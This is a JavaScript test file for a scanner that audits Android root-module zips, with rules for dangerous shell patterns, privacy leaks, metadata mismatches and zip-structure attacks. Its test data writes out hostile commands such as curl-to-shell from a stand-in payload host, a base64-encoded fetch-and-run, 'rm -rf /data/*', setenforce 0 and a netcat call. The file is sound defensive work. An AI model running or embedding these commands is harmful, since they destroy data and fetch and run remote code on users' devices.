// 模块审核规则单测（node:test，无外部依赖）
// 覆盖：rm -rf / curl|sh / base64 执行 / 写 /system / setenforce 0 / hosts / 硬编码 IP /
//       可疑域名 / 隐私用户名 / 邮箱 / 密钥 / 元数据一致性 —— 命中与不命中。
// 运行：node --test scan.test.mjs

import test from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdtempSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { deflateRawSync, crc32 } from 'node:zlib';

import {
  RULES_BY_ID, CONTENT_RULES, scanContent, checkMetadata, parseModuleProp,
  scoreRisk, decide, countsTowardRisk, SEVERITY_ORDER,
  inspectStructure, unsafePathReason, detectBinary, checkCoverage, checkUnread, checkBinaries,
  MAX_TEXT, MAX_ENTRIES, MAX_RATIO,
  EXEC_BUNDLED_FILE,
} from './risk-rules.mjs';
import { scanZip, classify, renderMarkdown, renderJSON, mask, resolveChangeType, CANONICAL_SCRIPTS, FLASH_ENTRY_POINTS, readZip, resolveBundledTargets, resolveBundledRefs, normalizeRefPath, EXEC_UNRESOLVED_ADVICE } from './scan.mjs';
import { makeModuleZip, moduleProp, scanToReport } from './fixtures.mjs';

// ---------------------------------------------------------------------------
// 辅助：命中判定
// ---------------------------------------------------------------------------

function hits(ruleId, text, file = 'customize.sh') {
  const rule = RULES_BY_ID[ruleId];
  assert.ok(rule, `规则 ${ruleId} 不存在`);
  return rule.scan(file, text).filter((f) => f.severity != null);
}

function assertHit(ruleId, text, msg) {
  const h = hits(ruleId, text);
  assert.ok(h.length > 0, `${ruleId} 应当命中：${msg || text}`);
  return h;
}

function assertNoHit(ruleId, text, msg) {
  const h = hits(ruleId, text);
  assert.equal(h.length, 0, `${ruleId} 不应命中：${msg || text} —— 实际命中 ${JSON.stringify(h)}`);
}

// ---------------------------------------------------------------------------
// ① 元信息：规则表完整性
// ---------------------------------------------------------------------------

test('规则表结构完整，每条规则都有 id/category/severity/advice', () => {
  assert.ok(CONTENT_RULES.length >= 10);
  for (const r of CONTENT_RULES) {
    assert.ok(r.id, '缺少 id');
    assert.ok(r.category, `${r.id} 缺少 category`);
    assert.ok(r.advice, `${r.id} 缺少 advice`);
    assert.equal(typeof r.scan, 'function', `${r.id}.scan 不是函数`);
    // scan 必须是纯函数：同一输入两次结果一致
    const a = JSON.stringify(r.scan('x.sh', 'echo hi\nrm -rf /data'));
    const b = JSON.stringify(r.scan('x.sh', 'echo hi\nrm -rf /data'));
    assert.equal(a, b, `${r.id} 不是确定性纯函数`);
  }
});

// ---------------------------------------------------------------------------
// ② 危险模式
// ---------------------------------------------------------------------------

test('RM_RF_MUTABLE：rm -rf 作用于 /data 命中且按作用域分档', () => {
  // 宽泛作用域 -> high
  const h = assertHit('RM_RF_MUTABLE', 'rm -rf /data/*');
  assert.equal(h[0].severity, 'high');
  assert.equal(h[0].line, 1);
  assert.equal(h[0].file, 'customize.sh');
  assert.match(h[0].snippet, /rm -rf/);

  // 分区下的具体子目录 -> medium
  const m = assertHit('RM_RF_MUTABLE', 'rm -rf /data/local/tmp/leftover');
  assert.equal(m[0].severity, 'medium');

  // 分区根 -> high
  assert.equal(hits('RM_RF_MUTABLE', 'rm -rf /system')[0].severity, 'high');
});

test('RM_RF_MUTABLE：删除模块自有目录不命中', () => {
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $MODPATH');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $MODDIR/system/app/Foo');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf /data/adb/modules/old_mod');
  assertNoHit('RM_RF_MUTABLE', 'rm -rf $TMPDIR/stage');
});

test('PIPE_TO_SHELL：curl|sh 与 wget -O-|sh 命中 high', () => {
  const a = assertHit('PIPE_TO_SHELL', 'curl -sL https://example.com/i.sh | sh');
  assert.equal(a[0].severity, 'high');
  const b = assertHit('PIPE_TO_SHELL', 'wget -O- http://1.2.3.4/x | bash');
  assert.equal(b[0].severity, 'high');
  assertHit('PIPE_TO_SHELL', 'curl http://a.b | busybox sh');
});

test('PIPE_TO_SHELL：落盘再执行不命中', () => {
  assertNoHit('PIPE_TO_SHELL', 'curl -sL https://example.com/m.zip -o /sdcard/m.zip');
  assertNoHit('PIPE_TO_SHELL', 'wget -O /tmp/m.zip https://example.com/m.zip');
  assertNoHit('PIPE_TO_SHELL', 'sh $MODPATH/install.sh');
});

test('DOWNLOAD_TO_STDOUT：wget -O- 命中 low', () => {
  const h = assertHit('DOWNLOAD_TO_STDOUT', 'wget -O- https://example.com/a.txt > /sdcard/a.txt');
  assert.equal(h[0].severity, 'low');
});

test('OBFUSCATED_DECODE_EXEC：base64 解码后管道执行命中 high，且不与 DECODE_ONLY 重复报', () => {
  const text = 'echo aGVsbG8gd29ybGQK | base64 -d | sh';
  const h = assertHit('OBFUSCATED_DECODE_EXEC', text);
  assert.equal(h[0].severity, 'high');
  assertNoHit('OBFUSCATED_DECODE_ONLY', text, '已由 EXEC 规则报 high，不应重复');
});

test('OBFUSCATED_DECODE_ONLY：仅解码未执行命中 medium', () => {
  const h = assertHit('OBFUSCATED_DECODE_ONLY', 'base64 -d payload.b64 > /data/local/tmp/p.bin');
  assert.equal(h[0].severity, 'medium');
  assertNoHit('OBFUSCATED_DECODE_ONLY', 'base64 image.png > out.txt'); // 无 -d，纯编码
});

test('WRITE_SYSTEM_VENDOR：直接写 /system 命中 high；$MODPATH 覆盖层不命中', () => {
  assert.equal(assertHit('WRITE_SYSTEM_VENDOR', 'cp busybox /system/xbin/bb')[0].severity, 'high');
  assertHit('WRITE_SYSTEM_VENDOR', 'mount -o rw,remount /system');
  assertHit('WRITE_SYSTEM_VENDOR', 'echo "ro.foo=1" >> /system/build.prop');
  // 标准覆盖层写法
  assertNoHit('WRITE_SYSTEM_VENDOR', 'cp -f busybox $MODPATH/system/xbin/bb');
  assertNoHit('WRITE_SYSTEM_VENDOR', 'mkdir -p $MODPATH/system/app/Foo');
});

test('SELINUX_DISABLE：setenforce 0 命中 high，setenforce 1 不命中', () => {
  assert.equal(assertHit('SELINUX_DISABLE', 'setenforce 0')[0].severity, 'high');
  assertHit('SELINUX_DISABLE', 'echo 0 > /sys/fs/selinux/enforce');
  assertNoHit('SELINUX_DISABLE', 'setenforce 1');
});

test('HOSTS_MODIFY：写 hosts 命中 medium；无关心文件不命中', () => {
  const h = assertHit('HOSTS_MODIFY', 'cp $MODPATH/hosts /system/etc/hosts');
  assert.equal(h[0].severity, 'medium');
  assertHit('HOSTS_MODIFY', 'echo "127.0.0.1 ads.example" >> /system/etc/hosts');
  assertNoHit('HOSTS_MODIFY', 'echo "hello" > /data/local/tmp/notes.txt');
});

// ---------------------------------------------------------------------------
// ③ 外联
// ---------------------------------------------------------------------------

test('HARDCODED_IP：公网 IP medium，内网/回环 low，版本号样式的数字串不命中', () => {
  assert.equal(assertHit('HARDCODED_IP', 'curl http://45.77.12.9/payload')[0].severity, 'medium');
  assert.equal(assertHit('HARDCODED_IP', 'nc 192.168.1.10 4444')[0].severity, 'low');
  assert.equal(assertHit('HARDCODED_IP', 'ping 127.0.0.1')[0].severity, 'low');
  assertNoHit('HARDCODED_IP', 'versionCode=1024');
  assertNoHit('HARDCODED_IP', '# 1.2.3.4 已废弃');
});

test('SUSPICIOUS_DOMAIN：遥测/广告域名与匿名 TLD 命中；正常域名不命中', () => {
  assertHit('SUSPICIOUS_DOMAIN', 'curl https://sdk.umeng.com/collect');
  assertHit('SUSPICIOUS_DOMAIN', 'POST https://www.googletagmanager.com/gtm.js');
  assertHit('SUSPICIOUS_DOMAIN', 'https://payload.xyz/drop');
  assertNoHit('SUSPICIOUS_DOMAIN', 'https://github.com/foo/bar');
  assertNoHit('SUSPICIOUS_DOMAIN', 'https://raw.githubusercontent.com/a/b/main/modules.json');
  assertNoHit('SUSPICIOUS_DOMAIN', '# see magisk docs');
});

test('NETWORK_FETCH：任意 http(s) 地址命中 low（供人工核对）', () => {
  assert.equal(assertHit('NETWORK_FETCH', 'https://example.com/x.zip')[0].severity, 'low');
  assertNoHit('NETWORK_FETCH', 'cp /sdcard/a /sdcard/b');
});

// ---------------------------------------------------------------------------
// ④ 投稿者隐私（info，不计入风险）
// ---------------------------------------------------------------------------

test('PRIVACY_HOME_USER：绝对路径用户名命中 info；root 等通用账号名不命中', () => {
  const h = assertHit('PRIVACY_HOME_USER', 'built at /home/johndoe/modules');
  assert.equal(h[0].severity, 'info');
  assert.equal(countsTowardRisk(h[0]), false, 'info 级不应计入风险等级');
  assertHit('PRIVACY_HOME_USER', 'C:\\Users\\Alice\\workspace\\mod');
  assertHit('PRIVACY_HOME_USER', '/Users/bob/code/mod');
  assertNoHit('PRIVACY_HOME_USER', '/home/root/mod');
  assertNoHit('PRIVACY_HOME_USER', 'MODDIR=/data/adb/modules/x');
});

test('PRIVACY_EMAIL：邮箱命中 info；noreply 地址不命中', () => {
  assert.equal(assertHit('PRIVACY_EMAIL', 'maintainer: zhangsan@example.com')[0].severity, 'info');
  assertNoHit('PRIVACY_EMAIL', 'author: foo@users.noreply.github.com');
});

test('PRIVACY_SECRET：AKIA / sk- / token= / 私钥头命中 info；纯变量引用不命中', () => {
  assertHit('PRIVACY_SECRET', 'AKIAIOSFODNN7EXAMPLE');
  assertHit('PRIVACY_SECRET', 'sk-abcdefghijklmnopqrstuvwx123456');
  assertHit('PRIVACY_SECRET', 'token=abcd1234efgh5678');
  assertHit('PRIVACY_SECRET', '-----BEGIN PRIVATE KEY-----');
  assertHit('PRIVACY_SECRET', 'password: hunter2hunter2');
  assertNoHit('PRIVACY_SECRET', 'token=$API_TOKEN');
  assertNoHit('PRIVACY_SECRET', '# password: 填你自己的');
});

// ---------------------------------------------------------------------------
// ⑤ 元数据一致性
// ---------------------------------------------------------------------------

test('parseModuleProp 正确解析键值与行号', () => {
  const { fields } = parseModuleProp('id=cool_mod\nversion=v1.2\nname=Cool\n# comment\nversionCode=3\n');
  assert.equal(fields.id.value, 'cool_mod');
  assert.equal(fields.id.line, 1);
  assert.equal(fields.version.value, 'v1.2');
  assert.equal(fields.version.line, 2);
  assert.equal(fields.versionCode.value, '3');
  assert.equal(fields['# comment'], undefined);
});

test('checkMetadata：一致则不报，id/version 不一致分别报 medium', () => {
  const prop = { present: true, path: 'module.prop', fields: parseModuleProp('id=a\nversion=v1\n').fields };
  const ok = checkMetadata(prop, { id: 'a', version: 'v1' });
  assert.equal(ok.filter((f) => f.ruleId.startsWith('META_') && f.severity !== 'low').length, 0, JSON.stringify(ok));

  const bad = checkMetadata(prop, { id: 'b', version: 'v2' });
  const ids = bad.map((f) => f.ruleId);
  assert.ok(ids.includes('META_ID_MISMATCH'), JSON.stringify(ids));
  assert.ok(ids.includes('META_VERSION_MISMATCH'), JSON.stringify(ids));
  assert.equal(bad.find((f) => f.ruleId === 'META_ID_MISMATCH').severity, 'medium');
});

test('checkMetadata：module.prop 缺失或字段缺失也报 medium', () => {
  const none = checkMetadata({ present: false, path: 'module.prop', fields: {} }, {});
  assert.ok(none.some((f) => f.ruleId === 'META_PROP_MISSING' && f.severity === 'medium'));

  const partial = checkMetadata({ present: true, path: 'module.prop', fields: parseModuleProp('id=a\n').fields }, { id: 'a' });
  assert.ok(partial.some((f) => f.ruleId === 'META_FIELD_MISSING_VERSION'));
});

// ---------------------------------------------------------------------------
// 定级与决策
// ---------------------------------------------------------------------------

test('scoreRisk：有 high 即 high，无 high 有 medium 即 medium，其余 low；info 不参与', () => {
  assert.equal(scoreRisk([{ severity: 'info' }]).level, 'low');
  assert.equal(scoreRisk([{ severity: 'low' }]).level, 'low');
  assert.equal(scoreRisk([{ severity: 'medium' }, { severity: 'info' }]).level, 'medium');
  assert.equal(scoreRisk([{ severity: 'high' }, { severity: 'low' }]).level, 'high');
  assert.equal(scoreRisk([]).level, 'low');
});

test('decide：低风险+首次收录才自动放行；版本更新即便低风险也人工审；中高风险一律人工', () => {
  const a = decide('low', 'first');
  assert.equal(a.action, 'auto-approve');
  assert.equal(a.label, 'auto-approved');
  assert.equal(a.needsHumanReview, false);

  const b = decide('low', 'update');
  assert.equal(b.action, 'request-review');
  assert.equal(b.label, 'needs-human-review');
  assert.equal(b.needsHumanReview, true);

  for (const lv of ['medium', 'high']) {
    for (const ct of ['first', 'update']) {
      const d = decide(lv, ct);
      assert.equal(d.needsHumanReview, true, `${lv}/${ct} 必须人工审`);
      assert.equal(d.label, 'needs-human-review');
    }
  }
  // 变更类型未知 -> 保守转人工
  assert.equal(decide('low', 'unknown').needsHumanReview, true);
});

test('resolveChangeType：依据索引判断首次收录 / 版本更新', () => {
  const prop = { fields: { id: { value: 'mod_x', line: 1 } } };
  assert.equal(resolveChangeType({ index: [{ id: 'mod_x' }] }, prop), 'update');
  assert.equal(resolveChangeType({ index: { modules: [{ moduleId: 'other' }] } }, prop), 'first');
  assert.equal(resolveChangeType({ index: ['mod_x'] }, prop), 'update');
  assert.equal(resolveChangeType({}, prop), 'unknown');
  assert.equal(resolveChangeType({ changeType: 'update' }, prop), 'update', '显式指定优先');
});

// ---------------------------------------------------------------------------
// 端到端：造 zip 跑 scanZip
// ---------------------------------------------------------------------------

function crc32buf(buf) {
  // node:zlib 的 crc32 在较新版本提供，这里保留 0 值兜底（zip 读取器不校验 CRC）
  try { return crc32(buf); } catch { return 0; }
}

function buildZip(entries) {
  // entries: [{ name, content(string|Buffer), method = 8, extAttr = 0,
  //             declaredOrig, declaredComp }] -> Buffer
  // declaredOrig/declaredComp 允许只改中心目录的声明值：测 zip bomb 与伪装条目时，
  // 需要的正是「声明与真实不一致」这种输入。
  const locals = [];
  const central = [];
  let offset = 0;
  for (const e of entries) {
    const nameBuf = Buffer.from(e.name, 'utf8');
    const dataBuf = Buffer.isBuffer(e.content) ? e.content : Buffer.from(String(e.content == null ? '' : e.content), 'utf8');
    const method = e.method == null ? 8 : e.method;
    const comp = method === 8 ? deflateRawSync(dataBuf) : dataBuf;
    const crc = crc32buf(dataBuf);
    const origDecl = e.declaredOrig == null ? dataBuf.length : e.declaredOrig;
    const compDecl = e.declaredComp == null ? comp.length : e.declaredComp;

    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0);
    lh.writeUInt16LE(20, 4);
    lh.writeUInt16LE(0, 6);
    lh.writeUInt16LE(method, 8);
    lh.writeUInt32LE(crc, 14);
    lh.writeUInt32LE(compDecl, 18);
    lh.writeUInt32LE(origDecl, 22);
    lh.writeUInt16LE(nameBuf.length, 26);
    lh.writeUInt16LE(0, 28);
    locals.push(lh, nameBuf, comp);

    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0);
    ch.writeUInt16LE(20, 4);
    ch.writeUInt16LE(20, 6);
    ch.writeUInt16LE(0, 8);
    ch.writeUInt16LE(method, 10);
    ch.writeUInt32LE(crc, 16);
    ch.writeUInt32LE(compDecl, 20);
    ch.writeUInt32LE(origDecl, 24);
    ch.writeUInt16LE(nameBuf.length, 28);
    ch.writeUInt32LE(e.extAttr || 0, 38);
    ch.writeUInt32LE(offset, 42);
    central.push(ch, nameBuf);

    offset += 30 + nameBuf.length + comp.length;
  }
  const cdBuf = Buffer.concat(central);
  const body = Buffer.concat(locals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cdBuf.length, 12);
  eocd.writeUInt32LE(body.length, 16);
  return Buffer.concat([body, cdBuf, eocd]);
}

function writeZip(name, entries) {
  const dir = mkdtempSync(join(tmpdir(), 'modaudit-'));
  const p = join(dir, name);
  writeFileSync(p, buildZip(entries));
  return p;
}

const CLEAN_PROP = 'id=cool_mod\nname=Cool Mod\nversion=v1.0\nversionCode=1\nauthor=anon\ndescription=demo\n';
const CLEAN_SH = '#!/system/bin/sh\necho "installing"\ncp -f busybox $MODPATH/system/xbin/bb\n';

test('端到端：干净模块（首次收录）判 low 且自动放行', () => {
  const p = writeZip('clean.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'service.sh', content: '#!/system/bin/sh\nexit 0\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.reader, 'builtin', '应走内置解析器');
  assert.equal(r.riskLevel, 'low', JSON.stringify(r.findings));
  assert.equal(r.decision.action, 'auto-approve');
  assert.equal(r.decision.label, 'auto-approved');
  assert.equal(r.meta.id, 'cool_mod');
  assert.equal(r.inventory.canonicalScripts.length, 2, '应识别两个规范脚本');
  // ① 脚本全文必须纳入报告
  assert.match(renderMarkdown(r), /## 脚本全文/);
  assert.match(renderMarkdown(r), /busybox \$MODPATH/);
});

test('端到端：恶意模块判 high，脚本全文与行号证据都在报告里', () => {
  const bad = [
    '#!/system/bin/sh',
    'setenforce 0',
    'curl -sL https://payload.xyz/i.sh | sh',
    'echo Y3VybCBodHRwOi8vNDUuNzcuMTIuOS94IHwgYmFzaAo= | base64 -d | sh',
    'rm -rf /data/*',
    'cp x /system/bin/x',
    'echo "0.0.0.0 a.umeng.com" >> /system/etc/hosts',
    '# built on /home/johndoe',
    'contact: me@example.com',
    'token=abcd1234efgh5678',
  ].join('\n');
  const p = writeZip('bad.zip', [
    { name: 'module.prop', content: 'id=evil_mod\nversion=v9\n' },
    { name: 'customize.sh', content: bad },
    { name: 'service.sh', content: bad },
    { name: 'uninstall.sh', content: bad },
    { name: 'action.sh', content: 'nc 192.168.1.10 4444\n' },
  ]);
  const r = scanZip(p, { declaredId: 'evil_mod', declaredVersion: 'v1', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.needsHumanReview, true);
  const ids = new Set(r.findings.map((f) => f.ruleId));
  for (const need of ['SELINUX_DISABLE', 'PIPE_TO_SHELL', 'OBFUSCATED_DECODE_EXEC',
    'RM_RF_MUTABLE', 'WRITE_SYSTEM_VENDOR', 'HOSTS_MODIFY', 'SUSPICIOUS_DOMAIN',
    'PRIVACY_HOME_USER', 'PRIVACY_EMAIL', 'PRIVACY_SECRET', 'META_VERSION_MISMATCH']) {
    assert.ok(ids.has(need), `应命中 ${need}；实际 ${[...ids].join(',')}`);
  }
  // 证据含文件名+行号+原文片段
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.equal(sel.file, 'customize.sh');
  assert.equal(sel.line, 2);
  assert.match(sel.snippet, /setenforce/);
  assert.ok(r.scripts.every((s) => typeof s.content === 'string' && s.content.length > 0));
  // 全文内嵌的是「会被执行或会被读的文本」：四个 .sh 入口 + module.prop
  // （.prop 属属性文件，installer/resetprop 会读，同样纳入行级规则）
  assert.equal(r.scripts.length, 5, 'customize/service/uninstall/action 四个 .sh 与 module.prop 全部纳入');
  assert.ok(r.scripts.some((s) => s.name === 'module.prop'));
});

test('端到端：低风险但为版本更新 -> 打 needs-human-review 不自动合入', () => {
  const p = writeZip('update.zip', [
    { name: 'module.prop', content: 'id=cool_mod\nversion=v1.1\n' },
    { name: 'customize.sh', content: CLEAN_SH },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.1', changeType: 'update' });
  assert.equal(r.riskLevel, 'low');
  assert.equal(r.decision.action, 'request-review');
  assert.equal(r.decision.label, 'needs-human-review');
  assert.equal(r.decision.needsHumanReview, true);
});

test('端到端：报告渲染 —— Markdown 含结论/表格/隐私脱敏，JSON 可解析', () => {
  const p = writeZip('privacy.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: '# built at /home/johndoe\n# contact me@example.com\nexit 0\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  const md = renderMarkdown(r);
  assert.match(md, /风险等级：LOW/);
  assert.match(md, /auto-approved/);
  assert.match(md, /投稿者隐私提示/);
  assert.ok(!md.includes('johndoe'), 'Markdown 中隐私原文应脱敏');
  assert.ok(!md.includes('me@example.com'));

  const j = JSON.parse(renderJSON(r));
  assert.equal(j.riskLevel, 'low');
  assert.equal(j.schema, 'module-audit-report/v1');
  const priv = j.findings.filter((f) => f.category === 'privacy');
  assert.ok(priv.length >= 2);
  assert.ok(priv.every((f) => !f.snippet.includes('johndoe')), 'JSON 隐私片段应脱敏');
});

test('mask 对短串原样返回，对长串打码', () => {
  assert.equal(mask('abcd'), 'abcd');
  const m = mask('johndoe_secret_value');
  assert.ok(m.includes('*'));
  assert.ok(!m.includes('secret_value'));
});

test('classify 按规范顺序排列五个脚本，其余归入 otherScripts/others', () => {
  const p = writeZip('cls.zip', [
    { name: 'action.sh', content: 'x' },
    { name: 'uninstall.sh', content: 'x' },
    { name: 'customize.sh', content: 'x' },
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'extra/helper.sh', content: 'x' },
    { name: 'README.md', content: 'x' },
  ]);
  const r = scanZip(p, {});
  assert.deepEqual(r.inventory.canonicalScripts.map((s) => s.name.split('/').pop()),
    ['customize.sh', 'uninstall.sh', 'action.sh']);
  assert.ok(r.inventory.otherScripts.some((s) => s.name === 'extra/helper.sh'));
  assert.ok(r.inventory.otherFiles.includes('README.md'));
});

test('缺少 module.prop 的 zip 报 META_PROP_MISSING 且不低于 medium', () => {
  const p = writeZip('noprop.zip', [{ name: 'customize.sh', content: CLEAN_SH }]);
  const r = scanZip(p, { changeType: 'first' });
  assert.ok(r.findings.some((f) => f.ruleId === 'META_PROP_MISSING'));
  assert.notEqual(r.riskLevel, 'low', '缺少 module.prop 不应判 low');
  assert.equal(r.decision.needsHumanReview, true);
});

// ---------------------------------------------------------------------------
// ⑥ 包结构与审核覆盖度
// ---------------------------------------------------------------------------

test('unsafePathReason：绝对路径 / 上跳 / 盘符 / 反斜杠里的 .. 都能认出', () => {
  assert.equal(unsafePathReason('system/etc/hosts'), null);
  assert.equal(unsafePathReason('../escape.sh'), '含 .. 的上跳路径');
  assert.equal(unsafePathReason('a/../../escape.sh'), '含 .. 的上跳路径');
  assert.equal(unsafePathReason('a\\..\\escape.sh'), '含 .. 的上跳路径', '反斜杠必须先归一化，否则 split("/") 看不见上跳');
  assert.equal(unsafePathReason('/system/etc/hosts'), '绝对路径');
  assert.equal(unsafePathReason('C:/Windows/x'), 'Windows 盘符绝对路径');
  assert.equal(unsafePathReason(''), '空条目名');
  assert.equal(unsafePathReason('a..b/config'), null, '文件名里含 .. 但不是路径段，不算上跳');
});

test('detectBinary：ELF/PE/Mach-O/DEX/class 与「开头含 NUL」命中，纯文本不命中', () => {
  assert.equal(detectBinary(Buffer.from('\x7fELF\x02\x01\x01', 'latin1')).id, 'ELF');
  assert.equal(detectBinary(Buffer.from('MZ\x90\x00', 'latin1')).id, 'PE');
  assert.equal(detectBinary(Buffer.from([0xfe, 0xed, 0xfa, 0xce, 0])).id, 'MACHO');
  assert.equal(detectBinary(Buffer.from([0xca, 0xfe, 0xba, 0xbe])).id, 'MACHO');
  assert.equal(detectBinary(Buffer.from([0xca, 0xfe, 0xba, 0xbe])).id, 'MACHO', 'fat 头，同时也是 Java class 的头四字节');
  assert.equal(detectBinary(Buffer.from([0xbf, 0xba, 0xfe, 0xca])).id, 'MACHO', 'fat 64 的小端');
  assert.equal(detectBinary(Buffer.from([0x7f, 0x45, 0x4c, 0x21])), null, 'ELF 头不完整不能误判；无 NUL 也不该算二进制');
  assert.equal(detectBinary(Buffer.from('dex\n035\0', 'latin1')).id, 'DEX');
  assert.equal(detectBinary(Buffer.from('name=foo\x00bar', 'utf8')).id, 'NUL', '改名成 .txt 的伪装');
  assert.equal(detectBinary(Buffer.from(CLEAN_SH, 'utf8')), null);
  assert.equal(detectBinary(Buffer.from('id=cool_mod', 'utf8')), null);
  assert.equal(detectBinary(null), null);
});

test('inspectStructure：重名/符号链接/越界/条目数/压缩比/超大各有对应级别，且都参与定级', () => {
  const { findings, stats } = inspectStructure([
    { name: 'module.prop', method: 8, compSize: 10, origSize: 40 },
    { name: '../escape.sh', method: 8, compSize: 10, origSize: 20 },
    { name: '/system/xbin/bb', method: 8, compSize: 10, origSize: 20 },
    { name: 'service.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'service.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'w.conf', method: 8, compSize: 10, origSize: 20, isSymlink: true },
    { name: 'secret.bin', method: 8, compSize: 10, origSize: 20, encrypted: true },
    { name: 'packed.bz2', method: 12, compSize: 10, origSize: 20 },
    { name: 'winpath\\a.sh', method: 8, compSize: 10, origSize: 20 },
    { name: 'bomb', method: 8, compSize: 1, origSize: 40000 },
  ]);
  const ids = new Set(findings.map((f) => f.ruleId));
  for (const need of ['STRUCT_UNSAFE_PATH', 'STRUCT_DUPLICATE_NAME', 'STRUCT_SYMLINK',
    'STRUCT_ENCRYPTED', 'STRUCT_UNSUPPORTED_METHOD', 'STRUCT_BACKSLASH_PATH', 'STRUCT_RATIO']) {
    assert.ok(ids.has(need), `应命中 ${need}；实际 ${[...ids].join(',')}`);
  }
  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_UNSAFE_PATH').severity, 'high');
  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_DUPLICATE_NAME').severity, 'high');
  assert.equal(findings.find((f) => f.ruleId === 'STRUCT_SYMLINK').severity, 'high');
  assert.ok(findings.every((f) => f.category === 'structure'));
  assert.ok(findings.every((f) => countsTowardRisk(f)), '结构发现必须参与定级，不能只是提示');
  assert.deepEqual(stats.duplicateNames, ['service.sh']);
  assert.equal(stats.symlinks.length, 1);
  assert.equal(stats.entries, 10);
  assert.equal(stats.fileEntries, 10);
});

test('inspectStructure：条目数与解压总量超阈值才报，正常包一条都不报', () => {
  const many = Array.from({ length: MAX_ENTRIES + 5 }, (_, i) => ({ name: `f/${i}.sh`, method: 8, compSize: 100, origSize: 120 }));
  const ids = inspectStructure(many).findings.map((f) => f.ruleId);
  assert.ok(ids.includes('STRUCT_ENTRY_COUNT'), JSON.stringify(ids));

  const bomb = [{ name: 'z', method: 8, compSize: 1000, origSize: 600 * 1024 * 1024 }];
  const b = inspectStructure(bomb).findings.map((f) => f.ruleId);
  assert.ok(b.includes('STRUCT_ZIP_BOMB'), JSON.stringify(b));

  const normal = inspectStructure([
    { name: 'module.prop', method: 8, compSize: 90, origSize: 180 },
    { name: 'customize.sh', method: 8, compSize: 60, origSize: 240 },
    { name: 'system/', method: 0, compSize: 0, origSize: 0, isDir: true },
  ]);
  assert.equal(normal.findings.length, 0, JSON.stringify(normal.findings));
  assert.equal(normal.stats.dirEntries, 1, '目录条目不参与重名/越界判断');
});

test('checkCoverage / checkUnread / checkBinaries 的发现一律不低于 medium，以挡住自动放行', () => {
  const cov = checkCoverage([{ name: 'big.sh', size: MAX_TEXT + 10, truncated: true }, { name: 'ok.sh', size: 10, truncated: false }]);
  assert.equal(cov.length, 1);
  assert.equal(cov[0].ruleId, 'AUDIT_COVERAGE_TRUNCATED');
  assert.ok(SEVERITY_ORDER[cov[0].severity] >= SEVERITY_ORDER.medium);

  const un = checkUnread([{ name: 'a', reason: 'x', overLimit: true }, { name: 'b', reason: 'y', overLimit: false }]);
  assert.equal(un.length, 2);
  assert.ok(un.every((f) => f.ruleId === 'STRUCT_UNREADABLE' && SEVERITY_ORDER[f.severity] >= SEVERITY_ORDER.medium));
  assert.match(un[0].advice, /zip bomb/);

  const bin = checkBinaries([{ name: 'update-binary', id: 'ELF', why: 'ELF 可执行文件/共享库', bytes: 4096 }]);
  assert.equal(bin[0].ruleId, 'STRUCT_BINARY');
  assert.ok(SEVERITY_ORDER[bin[0].severity] >= SEVERITY_ORDER.medium);
  assert.deepEqual(checkUnread([]), []);
});

// ---------------------------------------------------------------------------
// 端到端：结构类攻击必须拦得住
// ---------------------------------------------------------------------------

test('端到端：越界路径条目判 high 且绝不自动放行', () => {
  const p = writeZip('traversal.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: '../escape.sh', content: '#!/system/bin/sh\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.needsHumanReview, true);
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_UNSAFE_PATH' && f.file === '../escape.sh'));
});

test('端到端：符号链接条目判 high（脚本本身一行危险模式都没有也照样拦）', () => {
  const p = writeZip('symlink.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'customize.sh', content: CLEAN_SH },
    { name: 'link/hosts', content: '/data/data/com.xxx/databases/x.db', extAttr: 0xa1ff0000 },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.equal(r.riskLevel, 'high');
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_SYMLINK'));
  assert.deepEqual(r.structure.symlinks, ['link/hosts']);
});

test('端到端：重名条目判 high —— 扫描器看到的那份未必是被解压的那份', () => {
  const p = writeZip('dup.zip', [
    { name: 'module.prop', content: CLEAN_PROP },
    { name: 'service.sh', content: '#!/system/bin/sh\nexit 0\n' },
    { name: 'service.sh', content: '#!/system/bin/sh\nrm -rf /data/*\n' },
  ]);
  const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
  assert.ok(r.findings.some((f) => f.ruleId === 'STRUCT_DUPLICATE_NAME'), JSON.stringify(r.findings.map((f) => f.ruleId)));
  assert.equal(r.riskLevel, 'high');
  assert.deepEqual(r.structure.duplicateNames, ['service.sh']);
});

